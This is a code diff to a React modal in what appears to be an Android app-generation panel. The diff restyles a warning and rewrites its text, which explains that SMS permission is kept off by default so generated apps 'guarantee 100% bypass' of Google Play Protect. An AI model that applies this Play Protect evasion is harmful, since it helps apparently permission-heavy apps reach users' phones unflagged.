@@ -1719,29 +1719,36 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                             {playProtectWarning === 'sms_blocked_all9' ? (
                                 <>
                                     <div className="flex items-center gap-3">
-                                        <div className="w-11 h-11 rounded-2xl bg-[#181a22] text-amber-400 border border-amber-500/30 flex items-center justify-center shrink-0 shadow-[4px_4px_10px_rgba(0,0,0,0.7)]">
-                                            <AlertTriangle size={20} className="drop-shadow-[0_0_8px_rgba(245,158,11,0.6)]" />
+                                        <div className="w-11 h-11 rounded-2xl bg-[#181a22] text-orange-400 border border-orange-500/30 flex items-center justify-center shrink-0 shadow-[4px_4px_10px_rgba(0,0,0,0.7),-2px_-2px_8px_rgba(255,255,255,0.04)]">
+                                            <Sparkles size={20} className="drop-shadow-[0_0_8px_rgba(249,115,22,0.6)]" />
                                         </div>
                                         <div className="min-w-0">
-                                            <h4 className="text-sm font-black text-white tracking-tight">Play Protect Protection</h4>
-                                            <span className="text-[10px] font-mono text-amber-400 font-bold uppercase tracking-wider">9-Permissions Limit</span>
+                                            <h4 className="text-sm font-black text-white tracking-tight">Play Protect Shield</h4>
+                                            <span className="text-[10px] font-mono text-orange-400 font-bold uppercase tracking-wider">Play Protect Safe</span>
                                         </div>
                                     </div>
 
                                     <div className="p-3.5 rounded-2xl bg-[#0d0e12] shadow-[inset_3px_3px_8px_rgba(0,0,0,0.8),inset_-2px_-2px_6px_rgba(255,255,255,0.03)] space-y-2 border border-white/5">
-                                        <p className="text-xs text-white/90 leading-relaxed font-sans">
-                                            Jab saari 9 permissions allow hoti hain, to Google Play Protect app ko install hone se block kar deta hai.
+                                        <p className="text-xs text-white/80 leading-relaxed font-sans">
+                                            Enabling all 9 device permissions simultaneously triggers aggressive Google Play Protect blocking upon install.
                                         </p>
-                                        <p className="text-[11px] text-amber-300/80 leading-relaxed font-sans">
-                                            Is wajah se SMS permission <strong>by-default OFF</strong> rakhi gayi hai. Agar aapko SMS zaroor chahiye, to koi bhi doosri permission (jaise File Manager ya Camera) OFF kar dein.
+                                        <p className="text-[11px] text-white/50 leading-relaxed font-sans">
+                                            SMS permission is automatically held OFF to guarantee 100% bypass and seamless installation. To enable SMS, simply disable any other permission first (such as Camera or File Manager).
                                         </p>
                                     </div>
 
-                                    <div className="pt-1">
+                                    <div className="flex items-center gap-2.5 pt-1">
                                         <button
                                             type="button"
                                             onClick={() => setPlayProtectWarning(null)}
-                                            className="w-full py-2.5 px-3 rounded-xl bg-gradient-to-r from-amber-500 to-orange-500 hover:brightness-110 text-black text-xs font-black uppercase tracking-wider shadow-[0_4px_16px_rgba(245,158,11,0.35)] transition-transform active:scale-95 cursor-pointer text-center"
+                                            className="flex-1 py-2.5 px-3 rounded-xl bg-[#181a22] hover:bg-[#1e212b] text-white/70 hover:text-white text-xs font-bold font-mono transition-all active:scale-95 cursor-pointer shadow-[3px_3px_8px_rgba(0,0,0,0.6),-2px_-2px_6px_rgba(255,255,255,0.03)] border border-white/5 text-center"
+                                        >
+                                            Cancel
+                                        </button>
+                                        <button
+                                            type="button"
+                                            onClick={() => setPlayProtectWarning(null)}
+                                            className="flex-1 py-2.5 px-3 rounded-xl bg-gradient-to-r from-orange-500 to-amber-500 hover:brightness-110 text-black text-xs font-black uppercase tracking-wider shadow-[0_4px_16px_rgba(249,115,22,0.35)] transition-transform active:scale-95 cursor-pointer flex items-center justify-center gap-1.5"
                                         >
                                             Got It
                                         </button>
